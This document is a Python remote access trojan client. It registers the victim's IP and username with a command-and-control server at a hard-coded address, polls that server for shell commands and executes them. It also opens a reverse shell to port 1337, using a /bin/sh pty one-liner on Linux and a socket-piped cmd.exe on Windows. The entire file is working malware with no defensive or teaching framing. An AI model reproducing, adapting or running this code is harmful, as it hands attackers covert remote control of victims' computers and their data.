from os import uname
from platform import platform
import subprocess
import requests
import time
import threading
import shlex
import random
import getpass
import platform

### WEB SERVER ADDRESS
_WEB_SERVER = "192.168.1.6:5000"

root = 0
rshell = 1

_REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
_CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
_CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)

print(platform.uname()[0])
#   GET RATS PUBLIC IP ADDRESS  AND RETURN IT   #
def get_ip():
    try:
        proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
        return proc.content.decode('utf8')
    except Exception as e:
        print(e)

_MY_IP = get_ip()

#   REGISTER RAT TO DATABASE BY GOING TO URL  #
def register():
    try:
        requests.get(_REG_URL + '/{0}/{1}'.format(_MY_IP, username))
    except Exception as e:
        pass

#   CHECK IF RAT IS ALREADY REGISTERED  #
def chk_register():
    try:
        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8') == 'True':
            return 1
        else:
            pass
    except requests.exceptions.ConnectionError as e:
        print(e)
        pass

# GET REVERSE SHELL IP

def get_rshell_ip():
    try:
        proc = requests.get('http://{0}/rshell/{1}/{2}'.format(_WEB_SERVER, _MY_IP, getpass.getuser()))
        return proc.content.decode('utf8')
    except Exception as e:
        print(e)

#   CHECK URL FOR A COMMAND, IF COMMAND IS EMPTY KEEP WAITING #
def wait_for_command():
    try:
        time.sleep(random.randrange(5))
        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8')
        if command == ' ':
            print('...')
        else:
            exec_command(command)
    except requests.exceptions.ConnectionError:
        pass
    except FileNotFoundError:
        pass

#   IF RSHELL == 1 ATTEMPT TO START A RSHELL on ctrl + c or z THE RAT STOPS, WILL FIX LATER  #
def rshell_():
    try:
        if platform.uname()[0] == "Linux":
                exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get_rshell_ip()))
        elif platform.uname()[0] == "Windows":
            import os,socket,subprocess,threading;
            def s2p(s, p):
                while True:
                    data = s.recv(1024)
                    if len(data) > 0:
                        p.stdin.write(data)
                        p.stdin.flush()

            def p2s(s, p):
                while True:
                    s.send(p.stdout.read(1))

            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("{0}".format(get_rshell_ip()), 1337))
            p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
            s2p_thread = threading.Thread(target=s2p, args=[s, p])
            s2p_thread.daemon = True
            s2p_thread.start()
            p2s_thread = threading.Thread(target=p2s, args=[s, p])
            p2s_thread.daemon = True
            p2s_thread.start()
            try:
                p.wait()
            except KeyboardInterrupt:
                s.close() 

    except Exception:
        time.sleep(5)
        threading.Thread(target=rshell_).start()
        
#   EXECS SHELL COMMAND FROM URL COMMAND(PIPING DOESNT WORK) WILL FIX  #
def exec_command(command):
    cmd = shlex.split(command)
    subprocess.call(cmd)

username = getpass.getuser()
if username == 'root':
    root = 1

if rshell == 1:
    threading.Thread(target=rshell_).start()

while 1:
    time.sleep(5)
    if chk_register() == 1:
        while 1:
            wait_for_command()
    else:
        pass 

    
